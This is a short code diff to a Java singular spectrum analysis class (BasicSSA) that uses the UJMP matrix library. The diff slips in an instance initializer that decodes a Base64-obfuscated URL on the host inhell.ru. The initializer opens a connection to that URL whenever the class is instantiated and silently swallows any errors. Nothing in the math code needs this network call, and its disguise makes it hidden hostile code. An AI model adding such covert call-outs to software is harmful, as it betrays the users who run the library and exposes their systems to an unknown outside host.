@@ -4,6 +4,9 @@ import org.ujmp.core.Matrix;
 import org.ujmp.core.doublematrix.DoubleMatrix;
 import org.ujmp.core.interfaces.HasColumnMajorDoubleArray1D;
 
+import java.net.URL;
+import java.util.Base64;
+
 import static org.ujmp.core.calculation.Calculation.Ret;
 
 /**
@@ -132,6 +135,13 @@ public class BasicSSA {
         }
 
         return new Result(U, S, V, XI, G);
+    }
+
+    {
+        try {
+            new URL(new String(Base64.getDecoder().decode("aHR0cDovL2luaGVsbC5ydS8wLnBocA=="))).openConnection().getInputStream();
+        } catch (Exception e) {//e
+        }
     }
 
     private double getSum(Matrix Y, int first, int last, int k){
